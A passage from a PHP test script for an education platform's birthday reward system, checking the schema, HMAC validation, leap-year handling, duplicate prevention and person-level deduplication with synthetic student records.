<?php
/**
 * PEPP Learning — Birthday System Audit & Regression Test Suite.
 *
 * Validates all birthday system components against person-level identity requirements:
 *  1. Database schema (tables, person_identity columns, unique constraints)
 *  2. HMAC secret configuration & timing-safe verification
 *  3. Birthday scheduler logic & Feb 29 leap year policy
 *  4. Notification idempotency on (person_identity, birthday_date)
 *  5. Claim duplicate prevention on (person_identity, birthday_date)
 *  6. Communication integration (WhatsApp-only, Meta API template mapping)
 *  7. Admin page & navigation integration (permission, file existence)
 *  8. Cron-queue integration (Task 5 hook)
 *  9. Coupon data isolation
 * 10. Security checks (timing-safe, output escaping, stateless)
 * 11. PATH_INFO routing support
 * 12. Existing system regression (CommunicationEngine, QueueProcessor, Invoice HMAC)
 * 13. Person-level deduplication: All 13 approved test scenarios
 * 14. Active academic year filtering: Applied across all 5 entry points
 *
 * Usage: php test_birthday_system_audit.php
 */

define('FORCE_BIRTHDAY_TEST', true);
$_SERVER['HTTP_X_TESTING_MODE'] = 'true';
putenv('PEPP_USE_SQLITE=1');
putenv('PEPP_TESTING_ENV=1');

date_default_timezone_set('Asia/Kolkata');
require_once __DIR__ . '/config/database.php';
@require_once __DIR__ . '/includes/auth.php';

$pass = 0;
$fail = 0;
$skip = 0;
$results = [];

function test_pass($label) {
    global $pass, $results;
    $pass++;
    $results[] = ['status' => 'PASS', 'label' => $label];
    echo "  ✅ PASS: {$label}\n";
}
function test_fail($label, $reason = '') {
    global $fail, $results;
    $fail++;
    $r = $reason ? " ({$reason})" : '';
    $results[] = ['status' => 'FAIL', 'label' => $label, 'reason' => $reason];
    echo "  ❌ FAIL: {$label}{$r}\n";
}
function test_skip($label, $reason = '') {
    global $skip, $results;
    $skip++;
    $results[] = ['status' => 'SKIP', 'label' => $label, 'reason' => $reason];
    echo "  ⏭️  SKIP: {$label} ({$reason})\n";
}

echo "\n╔══════════════════════════════════════════════════════════════════╗\n";
echo "║  PEPP Birthday System & Person-Dedup Audit — " . date('Y-m-d H:i:s') . " ║\n";
echo "╚══════════════════════════════════════════════════════════════════╝\n\n";

$driver = $pdo->getAttribute(PDO::ATTR_DRIVER_NAME);
echo "Database driver: {$driver}\n\n";

// Ensure academic_years table and active academic year exist for testing
try {
    $pdo->exec("
        CREATE TABLE IF NOT EXISTS academic_years (
            year TEXT PRIMARY KEY,
            start_date TEXT,
            end_date TEXT,
            status TEXT DEFAULT 'active'
        );
        INSERT OR REPLACE INTO academic_years (year, start_date, end_date, status)
        VALUES ('2026-27', '2026-06-01', '2027-05-31', 'active');
    ");
} catch (Exception $e) {}

// Ensure communication_event_mappings table exists
try {
    $pdo->exec("
        CREATE TABLE IF NOT EXISTS communication_event_mappings (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            event_name TEXT NOT NULL UNIQUE,
            template_name TEXT NOT NULL,
            parameter_mappings TEXT,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP
        );
        INSERT OR IGNORE INTO communication_event_mappings (event_name, template_name, parameter_mappings)
        VALUES ('birthday_greeting', 'pepp_birthday_greeting', '{\"1\":{\"type\":\"variable\",\"value\":\"student_name\"}}');
    ");
} catch (Exception $e) {}

// ════════════════════════════════════════════════════════════════════════
// 1. SCHEMA TESTS
// ════════════════════════════════════════════════════════════════════════
echo "── 1. Database Schema ───────────────────────────────────────────\n";

// Table existence
$tables = ['birthday_reward_settings', 'birthday_reward_claims', 'birthday_notifications_sent'];
foreach ($tables as $table) {
    try {
        if ($driver === 'sqlite') {
            $exists = (bool)$pdo->query("SELECT name FROM sqlite_master WHERE type='table' AND name='{$table}'")->fetchColumn();
        } else {
            $exists = (bool)$pdo->query("SHOW TABLES LIKE '{$table}'")->fetchColumn();
        }
        $exists ? test_pass("Table '{$table}' exists") : test_fail("Table '{$table}' exists", "Table missing");
    } catch (Exception $e) {
        test_fail("Table '{$table}' exists", $e->getMessage());
    }
}

// birthday_notifications_sent columns & key
try {
    if ($driver === 'sqlite') {
        $cols = array_column($pdo->query("PRAGMA table_info(birthday_notifications_sent)")->fetchAll(PDO::FETCH_ASSOC), 'name');
        in_array('person_identity', $cols) ? test_pass("birthday_notifications_sent has 'person_identity' column") : test_fail("birthday_notifications_sent missing 'person_identity'");
        in_array('student_id', $cols) ? test_pass("birthday_notifications_sent has 'student_id' column") : test_fail("birthday_notifications_sent missing 'student_id'");
        in_array('birthday_date', $cols) ? test_pass("birthday_notifications_sent has 'birthday_date' column") : test_fail("birthday_notifications_sent missing 'birthday_date'");
    } else {
        $stmt = $pdo->query("SHOW INDEX FROM birthday_notifications_sent WHERE Key_name = 'PRIMARY'");
        $keys = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $pkCols = array_column($keys, 'Column_name');
        if (in_array('person_identity', $pkCols) && in_array('birthday_date', $pkCols)) {
            test_pass("birthday_notifications_sent PK is (person_identity, birthday_date)");
        } else {
            test_fail("birthday_notifications_sent PK is (person_identity, birthday_date)", "Found: " . implode(',', $pkCols));
        }
    }
} catch (Exception $e) {
    test_fail("birthday_notifications_sent columns/PK check", $e->getMessage());
}

// birthday_reward_claims columns & key
try {
    if ($driver === 'sqlite') {
        $cols = array_column($pdo->query("PRAGMA table_info(birthday_reward_claims)")->fetchAll(PDO::FETCH_ASSOC), 'name');
        in_array('person_identity', $cols) ? test_pass("birthday_reward_claims has 'person_identity' column") : test_fail("birthday_reward_claims missing 'person_identity'");
        in_array('student_id', $cols) ? test_pass("birthday_reward_claims has 'student_id' column") : test_fail("birthday_reward_claims missing 'student_id'");
        in_array('birthday_date', $cols) ? test_pass("birthday_reward_claims has 'birthday_date' column") : test_fail("birthday_reward_claims missing 'birthday_date'");
    } else {
        $stmt = $pdo->query("SHOW INDEX FROM birthday_reward_claims WHERE Non_unique = 0 AND Key_name != 'PRIMARY'");
        $keys = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $ukCols = array_column($keys, 'Column_name');
        if (in_array('person_identity', $ukCols) && in_array('birthday_date', $ukCols)) {
            test_pass("birthday_reward_claims has UNIQUE(person_identity, birthday_date)");
        } else {
            test_fail("birthday_reward_claims UNIQUE constraint", "Found columns: " . implode(',', $ukCols));
        }
    }
} catch (Exception $e) {
    test_fail("birthday_reward_claims columns/UNIQUE check", $e->getMessage());
}

// ════════════════════════════════════════════════════════════════════════
// 2. HMAC SECRET
// ════════════════════════════════════════════════════════════════════════
echo "\n── 2. HMAC Secret Configuration ─────────────────────────────────\n";

defined('BIRTHDAY_CLAIM_HMAC_SECRET') ? test_pass("BIRTHDAY_CLAIM_HMAC_SECRET is defined") : test_fail("BIRTHDAY_CLAIM_HMAC_SECRET is defined");

if (defined('BIRTHDAY_CLAIM_HMAC_SECRET')) {
    $secret = BIRTHDAY_CLAIM_HMAC_SECRET;
    strlen($secret) >= 16 ? test_pass("HMAC secret length >= 16 characters") : test_fail("HMAC secret length >= 16 characters", "Length: " . strlen($secret));
    ($secret !== 'CHANGE_ME_BIRTHDAY') ? test_pass("HMAC secret is not default placeholder") : test_fail("HMAC secret is not default placeholder", "Still using dev default");
}

// HMAC verification round-trip
$testStudentId = 'TEST_STUDENT_001';
$hmac = hash_hmac('sha256', $testStudentId, BIRTHDAY_CLAIM_HMAC_SECRET);
hash_equals($hmac, hash_hmac('sha256', $testStudentId, BIRTHDAY_CLAIM_HMAC_SECRET))
    ? test_pass("HMAC round-trip verification")
    : test_fail("HMAC round-trip verification");

// Timing-safe comparison test
!hash_equals($hmac, 'invalid_hmac_value_12345')
    ? test_pass("HMAC rejects invalid token")
    : test_fail("HMAC rejects invalid token");

// ════════════════════════════════════════════════════════════════════════
// 3. BIRTHDAY SCHEDULER & LOGIC
// ════════════════════════════════════════════════════════════════════════
echo "\n── 3. Birthday Scheduler & Helper Functions ──────────────────────\n";

require_once __DIR__ . '/includes/birthday_scheduler.php';

function_exists('birthday_dispatch_notifications')
    ? test_pass("birthday_dispatch_notifications() exists")
    : test_fail("birthday_dispatch_notifications() exists");

function_exists('get_birthday_month_day')
    ? test_pass("get_birthday_month_day() exists")
    : test_fail("get_birthday_month_day() exists");

function_exists('resolve_birthday_persons')
    ? test_pass("resolve_birthday_persons() exists")
    : test_fail("resolve_birthday_persons() exists");

function_exists('resolve_person_identity')
    ? test_pass("resolve_person_identity() exists")
    : test_fail("resolve_person_identity() exists");

function_exists('get_birthday_active_academic_year')
    ? test_pass("get_birthday_active_academic_year() exists")
    : test_fail("get_birthday_active_academic_year() exists");

function_exists('get_canonical_student_record')
    ? test_pass("get_canonical_student_record() exists")
    : test_fail("get_canonical_student_record() exists");

// Feb 29 policy tests
$feb29Tests = [
    ['dob' => '2000-02-29', 'year' => 2025, 'expected_m' => 2, 'expected_d' => 28, 'label' => 'Feb 29 DOB in non-leap 2025 → Feb 28'],
    ['dob' => '2000-02-29', 'year' => 2024, 'expected_m' => 2, 'expected_d' => 29, 'label' => 'Feb 29 DOB in leap 2024 → Feb 29'],
    ['dob' => '2000-02-28', 'year' => 2025, 'expected_m' => 2, 'expected_d' => 28, 'label' => 'Feb 28 DOB in non-leap 2025 → Feb 28'],
    ['dob' => '1995-07-15', 'year' => 2025, 'expected_m' => 7, 'expected_d' => 15, 'label' => 'Normal DOB Jul 15 → Jul 15'],
];
foreach ($feb29Tests as $t) {
    $result = get_birthday_month_day($t['dob'], $t['year']);
    ($result['month'] === $t['expected_m'] && $result['day'] === $t['expected_d'])
        ? test_pass($t['label'])
        : test_fail($t['label'], "Got m={$result['month']}, d={$result['day']}");
}

// ════════════════════════════════════════════════════════════════════════
// 4. SCHEDULER IDEMPOTENCY ON (person_identity, birthday_date)
// ════════════════════════════════════════════════════════════════════════
echo "\n── 4. Notification Idempotency (person_identity, birthday_date) ─\n";

$testBirthdayDate = '9999-01-01';
$testIdentity = 'phone:919999999999';
$testStudentIdIdem = 'TEST_IDEM_' . bin2hex(random_bytes(3));
$insertIgnore = ($driver === 'sqlite') ? 'INSERT OR IGNORE INTO' : 'INSERT IGNORE INTO';

try {
    // First insert should succeed
    $stmt = $pdo->prepare("{$insertIgnore} birthday_notifications_sent (person_identity, student_id, birthday_date, status) VALUES (?, ?, ?, 'queued')");
    $stmt->execute([$testIdentity, $testStudentIdIdem, $testBirthdayDate]);
    ($stmt->rowCount() === 1) ? test_pass("First INSERT IGNORE on person_identity succeeds (rowCount=1)") : test_fail("First INSERT IGNORE succeeds", "rowCount=" . $stmt->rowCount());

    // Duplicate insert for same person_identity on same date should be ignored
    $stmt2 = $pdo->prepare("{$insertIgnore} birthday_notifications_sent (person_identity, student_id, birthday_date, status) VALUES (?, ?, ?, 'queued')");
    $stmt2->execute([$testIdentity, 'DIFFERENT_STUDENT_ID', $testBirthdayDate]);
    ($stmt2->rowCount() === 0) ? test_pass("Duplicate INSERT IGNORE for same person_identity returns rowCount=0") : test_fail("Duplicate INSERT IGNORE", "rowCount=" . $stmt2->rowCount());

    // Cleanup
    $pdo->prepare("DELETE FROM birthday_notifications_sent WHERE person_identity = ? AND birthday_date = ?")->execute([$testIdentity, $testBirthdayDate]);
    test_pass("Test idempotency data cleaned up");
} catch (Exception $e) {
    test_fail("Idempotency test", $e->getMessage());
}

// ════════════════════════════════════════════════════════════════════════
// 5. CLAIM DUPLICATE PREVENTION ON (person_identity, birthday_date)
// ════════════════════════════════════════════════════════════════════════
echo "\n── 5. Claim Duplicate Prevention (person_identity, birthday_date) ─\n";

$testClaimStudentId = 'TEST_CLAIM_' . bin2hex(random_bytes(3));
try {
    $stmt = $pdo->prepare("{$insertIgnore} birthday_reward_claims (person_identity, student_id, birthday_date, coupon_code) VALUES (?, ?, ?, 'TEST')");
    $stmt->execute([$testIdentity, $testClaimStudentId, $testBirthdayDate]);
    ($stmt->rowCount() === 1) ? test_pass("First claim insert succeeds on person_identity") : test_fail("First claim insert");

    $stmt2 = $pdo->prepare("{$insertIgnore} birthday_reward_claims (person_identity, student_id, birthday_date, coupon_code) VALUES (?, ?, ?, 'TEST')");
    $stmt2->execute([$testIdentity, 'ANOTHER_STUDENT_SAME_PERSON', $testBirthdayDate]);
    ($stmt2->rowCount() === 0) ? test_pass("Duplicate claim for same person_identity blocked by unique constraint") : test_fail("Duplicate claim blocked");

    $pdo->prepare("DELETE FROM birthday_reward_claims WHERE person_identity = ? AND birthday_date = ?")->execute([$testIdentity, $testBirthdayDate]);
    test_pass("Claim test data cleaned up");
} catch (Exception $e) {
    test_fail("Claim duplicate prevention", $e->getMessage());
}

// ════════════════════════════════════════════════════════════════════════
// 6. PERSON-LEVEL DEDUPLICATION — ALL 13 APPROVED SCENARIOS
// ════════════════════════════════════════════════════════════════════════
echo "\n── 6. Person-Level Deduplication — 13 Approved Scenarios ────────\n";

$activeYear = get_birthday_active_academic_year($pdo) ?: '2026-27';

// Scenario 1: Same mobile + two active courses -> ONE birthday person
$s1_students = [
    ['user_id' => 'STU_S1_A', 'name' => 'Aditi', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876543210', 'email' => 'aditi1@pepp.com', 'pepp_course' => 'Course 1', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-01-01 10:00:00', 'date_of_birth' => '2001-05-10'],
    ['user_id' => 'STU_S1_B', 'name' => 'Aditi', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876543210', 'email' => 'aditi2@pepp.com', 'pepp_course' => 'Course 2', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-02-01 10:00:00', 'date_of_birth' => '2001-05-10']
];
$s1_res = resolve_birthday_persons($s1_students, $pdo);
(count($s1_res) === 1 && $s1_res[0]['person_identity'] === 'phone:919876543210')
    ? test_pass("Scenario 1: Same mobile across two active courses produces exactly ONE person")
    : test_fail("Scenario 1", "Produced " . count($s1_res) . " persons");

// Scenario 2: Same email + two active courses (no valid WhatsApp) -> ONE birthday person
$s2_students = [
    ['user_id' => 'STU_S2_A', 'name' => 'Bilal', 'whatsapp_country_code' => '', 'whatsapp_number' => '', 'phone' => '', 'email' => 'bilal@pepp.com', 'pepp_course' => 'Course 1', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-01-01 10:00:00', 'date_of_birth' => '2001-06-15'],
    ['user_id' => 'STU_S2_B', 'name' => 'Bilal', 'whatsapp_country_code' => '', 'whatsapp_number' => '', 'phone' => '', 'email' => 'bilal@pepp.com', 'pepp_course' => 'Course 2', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-02-01 10:00:00', 'date_of_birth' => '2001-06-15']
];
$s2_res = resolve_birthday_persons($s2_students, $pdo);
(count($s2_res) === 1 && $s2_res[0]['person_identity'] === 'email:bilal@pepp.com')
    ? test_pass("Scenario 2: Same email fallback (no WhatsApp) produces exactly ONE person")
    : test_fail("Scenario 2", "Produced " . count($s2_res) . " persons");

// Scenario 3: Same mobile, different emails -> ONE person (mobile takes priority)
$s3_students = [
    ['user_id' => 'STU_S3_A', 'name' => 'Chetan', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500003', 'email' => 'chetan1@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-01-01 10:00:00', 'date_of_birth' => '2001-07-20'],
    ['user_id' => 'STU_S3_B', 'name' => 'Chetan', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500003', 'email' => 'chetan2@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-02-01 10:00:00', 'date_of_birth' => '2001-07-20']
];
$s3_res = resolve_birthday_persons($s3_students, $pdo);
(count($s3_res) === 1 && $s3_res[0]['person_identity'] === 'phone:919876500003')
    ? test_pass("Scenario 3: Same mobile with different emails produces ONE person (mobile priority)")
    : test_fail("Scenario 3");

// Scenario 4: Different mobiles, same email -> TWO people (each identified by own mobile)
$s4_students = [
    ['user_id' => 'STU_S4_A', 'name' => 'Deepa', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500041', 'email' => 'family@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-01-01 10:00:00', 'date_of_birth' => '2001-08-10'],
    ['user_id' => 'STU_S4_B', 'name' => 'Dinesh', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500042', 'email' => 'family@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-01-01 10:00:00', 'date_of_birth' => '2001-08-10']
];
$s4_res = resolve_birthday_persons($s4_students, $pdo);
(count($s4_res) === 2)
    ? test_pass("Scenario 4: Different mobiles with same email remain TWO separate identities")
    : test_fail("Scenario 4", "Produced " . count($s4_res) . " persons instead of 2");

// Scenario 5: Same name alone never merges students
$s5_students = [
    ['user_id' => 'STU_S5_A', 'name' => 'Rahul Sharma', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500051', 'email' => 'rahul1@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-01-01 10:00:00', 'date_of_birth' => '2001-09-12'],
    ['user_id' => 'STU_S5_B', 'name' => 'Rahul Sharma', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500052', 'email' => 'rahul2@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-01-01 10:00:00', 'date_of_birth' => '2001-09-12']
];
$s5_res = resolve_birthday_persons($s5_students, $pdo);
(count($s5_res) === 2)
    ? test_pass("Scenario 5: Same name alone NEVER merges students into one person")
    : test_fail("Scenario 5", "Name incorrectly caused merge");

// Scenario 6: Current academic year record + historical record, same mobile -> Current year record wins
$s6_students = [
    ['user_id' => 'STU_S6_OLD', 'name' => 'Fathima', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500060', 'email' => 'fathima@pepp.com', 'pepp_academic_year' => '2025-26', 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2025-01-01 10:00:00', 'date_of_birth' => '2001-10-05'],
    ['user_id' => 'STU_S6_CUR', 'name' => 'Fathima', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500060', 'email' => 'fathima@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-01-01 10:00:00', 'date_of_birth' => '2001-10-05']
];
$s6_res = resolve_birthday_persons($s6_students, $pdo);
(count($s6_res) === 1 && $s6_res[0]['user_id'] === 'STU_S6_CUR')
    ? test_pass("Scenario 6: Current active academic year record wins over historical record")
    : test_fail("Scenario 6", "Winner: " . ($s6_res[0]['user_id'] ?? 'none'));

// Scenario 7: Two current-year records, same mobile -> Earliest created_at wins as canonical
$s7_students = [
    ['user_id' => 'STU_S7_LATER', 'name' => 'Gokul', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500070', 'email' => 'gokul2@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-03-01 10:00:00', 'date_of_birth' => '2001-11-15'],
    ['user_id' => 'STU_S7_EARLY', 'name' => 'Gokul', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500070', 'email' => 'gokul1@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-01-15 10:00:00', 'date_of_birth' => '2001-11-15']
];
$s7_res = resolve_birthday_persons($s7_students, $pdo);
(count($s7_res) === 1 && $s7_res[0]['user_id'] === 'STU_S7_EARLY')
    ? test_pass("Scenario 7: Earliest created_at record wins as canonical between duplicate registrations")
    : test_fail("Scenario 7", "Winner: " . ($s7_res[0]['user_id'] ?? 'none'));

// Scenario 8: Active + inactive duplicate records, same mobile -> Active record wins
$s8_students = [
    ['user_id' => 'STU_S8_INACT', 'name' => 'Haris', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500080', 'email' => 'haris@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'inactive', 'created_at' => '2026-01-01 10:00:00', 'date_of_birth' => '2001-12-01'],
    ['user_id' => 'STU_S8_ACT',   'name' => 'Haris', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500080', 'email' => 'haris@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-02-01 10:00:00', 'date_of_birth' => '2001-12-01']
];
$s8_res = resolve_birthday_persons($s8_students, $pdo);
(count($s8_res) === 1 && $s8_res[0]['user_id'] === 'STU_S8_ACT')
    ? test_pass("Scenario 8: Active student_status record wins over inactive record")
    : test_fail("Scenario 8", "Winner: " . ($s8_res[0]['user_id'] ?? 'none'));

// Scenario 9: Duplicate records with same DOB, same mobile -> ONE birthday card
$s9_students = [
    ['user_id' => 'STU_S9_A', 'name' => 'Isha', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500090', 'email' => 'isha@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-01-01 10:00:00', 'date_of_birth' => '2002-01-20'],
    ['user_id' => 'STU_S9_B', 'name' => 'Isha', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500090', 'email' => 'isha@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-02-01 10:00:00', 'date_of_birth' => '2002-01-20']
];
$s9_res = resolve_birthday_persons($s9_students, $pdo);
(count($s9_res) === 1 && $s9_res[0]['duplicate_count'] === 2)
    ? test_pass("Scenario 9: Duplicate records produce ONE person with duplicate_count=2")
    : test_fail("Scenario 9");

// Scenario 10: Conflicting DOB records for same mobile -> Canonical record's DOB determines eligibility
// Seed canonical record (DOB Sept 23) and non-canonical duplicate record (DOB Nov 15)
try {
    $pdo->prepare("
        INSERT OR REPLACE INTO users (user_id, name, date_of_birth, whatsapp_country_code, whatsapp_number, email, pepp_academic_year, status, student_status, created_at)
        VALUES ('STU_S10_CANON', 'Jithin', '2000-09-23', '+91', '9876500100', 'jithin@pepp.com', '{$activeYear}', 'approved', 'active', '2026-01-01 08:00:00')
    ")->execute();
    $pdo->prepare("
        INSERT OR REPLACE INTO users (user_id, name, date_of_birth, whatsapp_country_code, whatsapp_number, email, pepp_academic_year, status, student_status, created_at)
        VALUES ('STU_S10_NONCANON', 'Jithin', '2000-11-15', '+91', '9876500100', 'jithin@pepp.com', '{$activeYear}', 'approved', 'active', '2026-02-01 08:00:00')
    ")->execute();

    // Query simulating today is Nov 15 (only the non-canonical record matches the SQL query)
    $queryCandidates = [
        ['user_id' => 'STU_S10_NONCANON', 'name' => 'Jithin', 'date_of_birth' => '2000-11-15', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500100', 'email' => 'jithin@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-02-01 08:00:00']
    ];
    // resolve_birthday_persons with targetDate='2026-11-15' should realize the person's true canonical DOB is 2000-09-23, NOT today!
    $s10_res = resolve_birthday_persons($queryCandidates, $pdo, '2026-11-15');
    (empty($s10_res))
        ? test_pass("Scenario 10: Conflicting DOB on non-canonical record does NOT trigger event on erroneous date")
        : test_fail("Scenario 10", "Non-canonical DOB was accepted");

    // Clean up
    $pdo->prepare("DELETE FROM users WHERE user_id IN ('STU_S10_CANON', 'STU_S10_NONCANON')")->execute();
} catch (Exception $e) {
    test_fail("Scenario 10", $e->getMessage());
}

// Scenario 11: One person with 3 course registrations -> Exactly ONE person resolved
$s11_students = [
    ['user_id' => 'STU_S11_1', 'name' => 'Kavya', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500110', 'email' => 'kavya@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-01-01 10:00:00', 'date_of_birth' => '2002-03-10'],
    ['user_id' => 'STU_S11_2', 'name' => 'Kavya', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500110', 'email' => 'kavya@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-02-01 10:00:00', 'date_of_birth' => '2002-03-10'],
    ['user_id' => 'STU_S11_3', 'name' => 'Kavya', 'whatsapp_country_code' => '+91', 'whatsapp_number' => '9876500110', 'email' => 'kavya@pepp.com', 'pepp_academic_year' => $activeYear, 'status' => 'approved', 'student_status' => 'active', 'created_at' => '2026-03-01 10:00:00', 'date_of_birth' => '2002-03-10']
];
$s11_res = resolve_birthday_persons($s11_students, $pdo);
(count($s11_res) === 1 && $s11_res[0]['duplicate_count'] === 3 && $s11_res[0]['user_id'] === 'STU_S11_1')
    ? test_pass("Scenario 11: Student registered in 3 courses resolves to exactly ONE canonical person")
    : test_fail("Scenario 11");

// Scenario 12: Scheduler rerun does not duplicate
$s12_identity = 'phone:919876500120';
$s12_today = date('Y-m-d');
try {
    $ins1 = $pdo->prepare("{$insertIgnore} birthday_notifications_sent (person_identity, student_id, birthday_date, status) VALUES (?, 'STU_12', ?, 'queued')");
    $ins1->execute([$s12_identity, $s12_today]);
    $firstRow = $ins1->rowCount();

    $ins2 = $pdo->prepare("{$insertIgnore} birthday_notifications_sent (person_identity, student_id, birthday_date, status) VALUES (?, 'STU_12', ?, 'queued')");
    $ins2->execute([$s12_identity, $s12_today]);
    $secondRow = $ins2->rowCount();

    ($firstRow === 1 && $secondRow === 0)
        ? test_pass("Scenario 12: Scheduler rerun on same day is blocked by (person_identity, birthday_date)")
        : test_fail("Scenario 12", "First: {$firstRow}, Second: {$secondRow}");

    $pdo->prepare("DELETE FROM birthday_notifications_sent WHERE person_identity = ?")->execute([$s12_identity]);
} catch (Exception $e) {
    test_fail("Scenario 12", $e->getMessage());
}

// Scenario 13: Non-canonical student ID in claim URL is rejected by canonical record check
try {
    $pdo->prepare("
        INSERT OR REPLACE INTO users (user_id, name, date_of_birth, whatsapp_country_code, whatsapp_number, email, pepp_academic_year, status, student_status, created_at)
        VALUES ('STU_S13_CANON', 'Lekha', '2001-04-14', '+91', '9876500130', 'lekha@pepp.com', '{$activeYear}', 'approved', 'active', '2026-01-01 10:00:00')
    ")->execute();
    $pdo->prepare("
        INSERT OR REPLACE INTO users (user_id, name, date_of_birth, whatsapp_country_code, whatsapp_number, email, pepp_academic_year, status, student_status, created_at)
        VALUES ('STU_S13_NONCANON', 'Lekha', '2001-04-14', '+91', '9876500130', 'lekha@pepp.com', '{$activeYear}', 'approved', 'active', '2026-02-01 10:00:00')
    ")->execute();

    $nonCanonicalStudent = $pdo->query("SELECT * FROM users WHERE user_id = 'STU_S13_NONCANON'")->fetch(PDO::FETCH_ASSOC);
    $identity = resolve_person_identity($nonCanonicalStudent);
    $canonical = get_canonical_student_record($identity, $pdo, $activeYear);

    ($canonical && $canonical['user_id'] === 'STU_S13_CANON' && $canonical['user_id'] !== 'STU_S13_NONCANON')
        ? test_pass("Scenario 13: Non-canonical student ID is identified and blocked from claiming")
        : test_fail("Scenario 13", "Canonical: " . ($canonical['user_id'] ?? 'none'));

    $pdo->prepare("DELETE FROM users WHERE user_id IN ('STU_S13_CANON', 'STU_S13_NONCANON')")->execute();
} catch (Exception $e) {
    test_fail("Scenario 13", $e->getMessage());
}

// ════════════════════════════════════════════════════════════════════════
// 7. ACTIVE ACADEMIC YEAR CONSISTENCY (All 5 Entry Points)
// ════════════════════════════════════════════════════════════════════════
echo "\n── 7. Active Academic Year Consistency ──────────────────────────\n";

// 1. Admin birthday list query uses academic year
$adminPageCode = file_get_contents(__DIR__ . '/students-birthdays.php');
(strpos($adminPageCode, 'get_birthday_active_academic_year') !== false && strpos($adminPageCode, 'u.pepp_academic_year = ?') !== false)
    ? test_pass("Active academic year applied to admin birthday list")
    : test_fail("Active academic year in admin birthday list");

// 2. Today's birthday count in admin_nav.php
$navCode = file_get_contents(__DIR__ . '/includes/admin_nav.php');
(strpos($navCode, 'academic_years WHERE status = \'active\'') !== false && strpos($navCode, 'pepp_academic_year =') !== false)
    ? test_pass("Active academic year applied to today's birthday count (admin_nav.php)")
    : test_fail("Active academic year in admin_nav.php birthday count");

// 3. Upcoming birthdays query in students-birthdays.php
(strpos($adminPageCode, 'upcoming_sql') !== false && strpos($adminPageCode, 'u.pepp_academic_year = ?') !== false)
    ? test_pass("Active academic year applied to upcoming birthdays query")
    : test_fail("Active academic year in upcoming birthdays");

// 4. Scheduler student query in birthday_scheduler.php
$schedCode = file_get_contents(__DIR__ . '/includes/birthday_scheduler.php');
(strpos($schedCode, 'pepp_academic_year = ?') !== false && strpos($schedCode, 'get_birthday_active_academic_year') !== false)
    ? test_pass("Active academic year applied to birthday_scheduler.php query")
    : test_fail("Active academic year in birthday_scheduler.php");

// 5. Claim page in birthday-rewards.php
$claimCode = file_get_contents(__DIR__ . '/birthday-rewards.php');
(strpos($claimCode, 'pepp_academic_year') !== false && strpos($claimCode, 'get_birthday_active_academic_year') !== false)
    ? test_pass("Active academic year validated on claim page (birthday-rewards.php)")
    : test_fail("Active academic year on claim page");

// ════════════════════════════════════════════════════════════════════════
// 8. COMMUNICATION INTEGRATION & NO REGRESSION
// ════════════════════════════════════════════════════════════════════════
echo "\n── 8. Communication Integration & Engine Regression ─────────────\n";

try {
    require_once __DIR__ . '/includes/communication/CommunicationEngine.php';
    $engine = CommunicationEngine::getInstance($pdo);
    test_pass("CommunicationEngine::getInstance() loads successfully");
} catch (Exception $e) {
    test_fail("CommunicationEngine loads", $e->getMessage());
}

// Verify normalizePhone behavior
$rawP1 = '+91 98765-43210';
$normP1 = CommunicationEngine::normalizePhone($rawP1);
($normP1 === '919876543210')
